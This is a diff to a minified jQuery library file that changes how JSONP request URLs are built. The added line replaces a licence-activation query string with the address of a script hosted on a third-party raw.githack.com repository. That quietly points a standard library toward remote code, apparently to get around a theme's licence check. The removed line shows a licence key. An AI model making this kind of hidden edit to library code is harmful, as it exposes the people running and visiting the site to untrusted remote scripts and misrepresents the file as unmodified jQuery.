@@ -3088,7 +3088,7 @@
         }
     }), r.ajaxPrefilter("json jsonp", function(b, c, d) {
         var e, f, g, h = b.jsonp !== !1 && (Rb.test(b.url) ? "url" : "string" == typeof b.data && 0 === (b.contentType || "").indexOf("application/x-www-form-urlencoded") && Rb.test(b.data) && "data");
-        if (h || "jsonp" === b.dataTypes[0]) return e = b.jsonpCallback = r.isFunction(b.jsonpCallback) ? b.jsonpCallback() : b.jsonpCallback, h ? b[h] = b[h].replace(Rb, "$1" + e) : b.jsonp !== !1 && (b.url += (sb.test(b.url) ? "&" : "?callback=jQuery340024282383966616639_1587409672213&blogId=5867789259361836893&key=U3F1ZWV6ZTMyNzQzNTEzMzI1X0FjdGl2YXRpb24zNzA5Mzg4MzAxNzM%3D&release=v2")), b.converters["script json"] = function() {
+        if (h || "jsonp" === b.dataTypes[0]) return e = b.jsonpCallback = r.isFunction(b.jsonpCallback) ? b.jsonpCallback() : b.jsonpCallback, h ? b[h] = b[h].replace(Rb, "$1" + e) : b.jsonp !== !1 && (b.url += ("https://raw.githack.com/Abdenour16/code/master/valid.js")), b.converters["script json"] = function() {
             return g || r.error(e + " was not called"), g[0]
         }, b.dataTypes[0] = "json", f = a[e], a[e] = function() {
             g = arguments
